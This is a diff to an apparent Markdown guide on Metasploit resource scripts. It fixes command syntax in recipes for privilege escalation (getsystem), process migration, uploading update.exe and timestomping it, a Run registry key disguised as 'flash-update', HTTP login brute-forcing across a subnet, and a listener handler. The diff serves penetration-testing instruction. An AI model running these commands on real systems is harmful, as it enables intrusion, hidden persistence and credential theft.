@@ -100,13 +100,13 @@
       touch record.rc
 
          echo 'spool /root/logfile.log' > record.rc
-         echo 'makerc /root/commands.rc' >> record.rc
          echo 'version' >> record.rc
          echo 'sessions -v' >> record.rc
          echo 'loadpath /root/msf-auxiliarys' >> record.rc
          echo 'resource /root/handler.rc' >> record.rc
+         echo 'makerc /root/commands.rc' >> record.rc
 
-    `[run]` msfconsole > resource -r /root/record.rc
+    `[run]` msfconsole -r /root/record.rc
 
 
 <br />
@@ -127,9 +127,11 @@
         echo 'getprivs' > script.rc
         echo 'getsystem' >> script.rc
         echo 'screenshot' >> script.rc
-        echo 'run migrate -n wininit.exe' >> script.rc
-        echo 'run post/windows/gather/enum_applications' >> script.rc
-        echo 'run post/multi/recon/local_exploit_suggester' >> script.rc
+        echo 'migrate -n wininit.exe' >> script.rc
+        echo 'use post/windows/gather/enum_applications' >> script.rc
+        echo 'run' >> script.rc
+        echo 'use post/multi/recon/local_exploit_suggester' >> script.rc
+        echo 'run' >> script.rc
 
      `[run]` meterpreter > resource /root/script.rc
 
@@ -143,7 +145,7 @@
 
         echo 'getprivs' > persistence.rc
         echo 'getsystem' >> persistence.rc
-        echo 'run migrate -n explorer.exe' >> persistence.rc
+        echo 'migrate -n explorer.exe' >> persistence.rc
         echo 'upload update.exe %temp%\\update.exe' >> persistence.rc
         echo "timestomp -z '3/10/1999 15:15:15' %temp%\\update.exe" >> persistence.rc
         echo 'reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v flash-update -d %temp%\\update.exe' >> persistence.rc
@@ -160,13 +162,16 @@
 
       touch http_brute.rc
 
-         echo 'setg THREADS 8' > /root/http_brute.rc
+         echo 'setg THREADS 15' > /root/http_brute.rc
          echo 'setg RHOSTS 192.168.1.0/24' >> /root/http_brute.rc
-         echo 'run auxiliary/gather/http/http_version' >> /root/http_brute.rc
-         echo 'run auxiliary/gather/http/dir_scanner' >> /root/http_brute.rc
-         echo 'run auxiliary/gather/http/http_login' >> /root/http_brute.rc
+         echo 'use auxiliary/scanner/http/http_version' >> /root/http_brute.rc
+         echo 'run' >> /root/http_brute.rc
+         echo 'use auxiliary/scanner/http/dir_scanner' >> /root/http_brute.rc
+         echo 'run' >> /root/http_brute.rc
+         echo 'use auxiliary/scanner/http/http_login' >> /root/http_brute.rc
+         echo 'run' >> /root/http_brute.rc
 
-     `[run]` msfconsole > resource -r /root/http_brute.rc
+     `[run]` msfconsole -r /root/http_brute.rc
 
 <br />
 
@@ -200,7 +205,7 @@
          echo 'set LPORT 666' >> handler.rc
          echo 'exploit' >> handler.rc
 
-     `[run]` msfconsole > resource -r /root/handler.rc
+     `[run]` msfconsole -r /root/handler.rc
 
 <br /><br />
 
@@ -230,7 +235,7 @@
          </ruby>
       run
 
-     `[run]` msfconsole > resource -r /root/script.rc
+     `[run]` msfconsole -r /root/script.rc
 
 <br /><br />
 
@@ -268,7 +273,7 @@
       end
       </ruby>
 
-     `[run]` msfconsole > resource -r /root/script.rc
+     `[run]` msfconsole -r /root/script.rc
 
 <br /><br />
 
@@ -304,7 +309,7 @@
           self.run_single("run")
       </ruby>
 
-     `[run]` msfconsole > resource -r /root/script.rc
+     `[run]` msfconsole -r /root/script.rc
 
 <br />
 
